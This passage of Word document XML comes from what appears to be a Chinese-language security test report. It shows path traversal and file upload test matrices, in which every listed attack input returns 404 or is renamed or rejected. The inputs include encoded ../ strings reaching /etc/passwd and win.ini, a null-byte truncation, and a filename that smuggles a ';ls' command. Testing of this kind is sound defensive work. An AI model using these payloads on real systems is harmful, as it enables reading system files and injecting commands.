                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>✅</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>Unicode 编码绕过</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>..%252f..%252f..%252fetc/passwd</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>404</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>✅</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>双斜杠绕过</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>....//....//....//etc/passwd</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>404</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>✅</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>绝对路径</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>/etc/passwd</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>404</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>✅</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>绝对路径深穿越</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>/opt/Class01/app.py</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>404</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>✅</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>空字节截断</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>../../etc/passwd%00.html</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>404</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>✅</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>文件 + 路径组合</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>help/../../etc/passwd</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>404</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>✅</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>Windows 路径</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>..\..\..\windows\win.ini</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>404</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>✅</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:spacing w:before="240" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b/>
          <w:color w:val="333333"/>
          <w:sz w:val="26"/>
        </w:rPr>
        <w:t>7.2 文件上传边界测试矩阵</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667eea"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>测试类别</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1881"/>
            <w:shd w:fill="667eea"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>测试用例</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1881"/>
            <w:shd w:fill="667eea"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>预期</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1881"/>
            <w:shd w:fill="667eea"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>实际</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1881"/>
          </w:tcPr>
          <w:p/>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1881"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>标准图片</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1881"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>合法 JPG/PNG/GIF 文件</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1881"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>上传成功</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1881"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>✅</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1881"/>
          </w:tcPr>
          <w:p/>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1881"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>路径穿越文件名</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1881"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>../../templates/evil.jpg</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>（内容合法）</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1881"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>UUID 重命名</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1881"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>✅</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1881"/>
          </w:tcPr>
          <w:p/>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1881"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>空文件名</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1881"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>filename=""</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1881"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>拒绝</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1881"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>✅</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1881"/>
          </w:tcPr>
          <w:p/>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1881"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>超长文件名</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1881"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>256 字符文件名</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1881"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>UUID 重命名</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1881"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>✅</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1881"/>
          </w:tcPr>
          <w:p/>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1881"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>特殊字符文件名</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1881"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>`../../../etc</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1881"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>passwd;ls.jpg`</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1881"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>UUID 重命名</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1881"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>✅</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1881"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>双扩展名</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1881"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
